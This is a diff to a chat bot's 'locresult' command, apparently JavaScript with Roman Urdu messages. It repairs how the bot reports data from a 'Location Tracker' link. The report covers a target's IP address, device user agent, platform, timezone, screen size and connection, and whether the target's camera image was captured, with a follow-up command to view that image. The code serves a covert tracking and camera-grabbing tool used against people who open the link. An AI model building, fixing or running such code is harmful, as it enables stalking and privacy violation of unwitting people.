@@ -13658,18 +13658,28 @@ case 'locresult': {
         if (!d || d.error) return reply(`❌ *Session not found.*\nToken galat hai ya 2 ghante se zyada purana hai.`);
 
         const _lcMet = d.metrics || {};
-        const _lcConn = _lcMet.connection ? `${_lcMet.connection.type} (${_lcMet.connection.downlink} Mbps)` : 'N/A';
+        // FIX: client JS sends 'ua' (not 'userAgent'), 'tz' (not 'timeZone'),
+        // 'screen.w×h' (not 'viewport'), 'conn.type/dl' (not 'connection')
+        const _lcDevice = _lcMet.ua ? _lcMet.ua.substring(0, 80) + '…' : 'N/A';
+        const _lcPlatform = _lcMet.platform || 'N/A';
+        const _lcTz = _lcMet.tz || 'N/A';
+        const _lcScreen = (_lcMet.screen && _lcMet.screen.w)
+            ? `${_lcMet.screen.w}×${_lcMet.screen.h}`
+            : 'N/A';
+        const _lcConn = (_lcMet.conn && _lcMet.conn.type)
+            ? `${_lcMet.conn.type} (${_lcMet.conn.dl} Mbps)`
+            : 'N/A';
         const _lcTime = d.timestamp ? new Date(d.timestamp).toLocaleString('en-PK', { timeZone: 'Asia/Karachi' }) : 'N/A';
 
         const _lcReport =
             `📊 *Location Tracker — Results*\n\n` +
             `👤 *User ID:* ${d.userId || 'N/A'}\n` +
             `🌐 *IP Address:* ${d.ip || '⏳ Not yet visited'}\n` +
-            `📱 *Device:* ${_lcMet.userAgent ? _lcMet.userAgent.substring(0, 80) + '…' : 'N/A'}\n` +
-            `💻 *Platform:* ${_lcMet.platform || 'N/A'}\n` +
-            `🌍 *TimeZone:* ${_lcMet.timeZone || 'N/A'}\n` +
+            `📱 *Device:* ${_lcDevice}\n` +
+            `💻 *Platform:* ${_lcPlatform}\n` +
+            `🌍 *TimeZone:* ${_lcTz}\n` +
             `📡 *Connection:* ${_lcConn}\n` +
-            `🖥️ *Screen:* ${_lcMet.viewport ? `${_lcMet.viewport.width}×${_lcMet.viewport.height}` : 'N/A'}\n` +
+            `🖥️ *Screen:* ${_lcScreen}\n` +
             `📸 *Camera:* ${d.hasCamera ? '✅ Captured!' : '❌ Not captured yet'}\n` +
             `🕒 *Last Seen:* ${_lcTime}\n\n` +
             `${d.hasCamera ? `📷 Camera image dekhne ke liye:\n*${prefix}loccam ${_lcToken}*` : ''}`;
